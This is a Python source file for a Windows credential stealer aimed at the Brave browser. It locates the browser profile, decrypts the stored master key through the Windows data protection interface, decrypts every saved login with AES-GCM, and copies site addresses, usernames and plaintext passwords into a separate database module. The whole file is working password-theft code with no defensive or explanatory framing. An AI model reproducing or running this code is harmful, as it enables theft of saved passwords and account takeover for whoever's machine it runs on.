import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

class Brave:
    def __init__(self,path, file_path):
        found,path = self.test_for_brave(path, file_path)
        if(found):
            self.print_pwd(path)

    def test_for_brave(self,path,file_path):
        for root, dirs, files in os.walk(path):
            if str(path+ "" + file_path) in root:
                return True,root
        return False,None

    def print_pwd(self,path):
        key = self.fetching_encryption_key(path)
        db_path = os.path.join(path,  "default","Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)

        # connecting to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
	
	    # 'logins' table has the data
        cursor.execute(
		"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
		"order by date_last_used")

        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = self.password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usuage = row[5]

            if user_name or decrypted_password:
                if date_of_creation != 86400000000 and date_of_creation:
                    date_of_creation_temp = str(self.chrome_date_and_time(date_of_creation))
                else:
                    date_of_creation_temp = None
                
                if last_usuage != 86400000000 and last_usuage:
                    last_usuage_temp = str(self.chrome_date_and_time(last_usuage))
                else:
                    last_usuage_temp = None
                    
                from database import Database
                db_user = Database.insert_passwords(main_url, login_page_url, user_name, decrypted_password, str(self.chrome_date_and_time(date_of_creation)), str(self.chrome_date_and_time(last_usuage)))
                # print(f"Main URL: {main_url}")
                # print(f"Login URL: {login_page_url}")
                # print(f"User name: {user_name}")
                # print(f"Decrypted Password: {decrypted_password}")
            else:
                continue
            
            # if date_of_creation != 86400000000 and date_of_creation:
            #     print(f"Creation date: {str(self.chrome_date_and_time(date_of_creation))}")
            
            # if last_usuage != 86400000000 and last_usuage:
            #     print(f"Last Used: {str(self.chrome_date_and_time(last_usuage))}")
            # print("=" * 100)
        cursor.close()
        db.close()
        
        try:
            os.remove(filename)
        except:
            pass
    
    def fetching_encryption_key(self,path):
        path = os.path.join(path, "Local State")
        print(path)
        with open(path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
        
            encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])
        
        # remove Windows Data Protection API (DPAPI) str
        encryption_key = encryption_key[5:]
        
        # return decrypted key
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    
    def password_decryption(self,password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
            
            # generate cipher
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    def chrome_date_and_time(self,chrome_data):
	    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

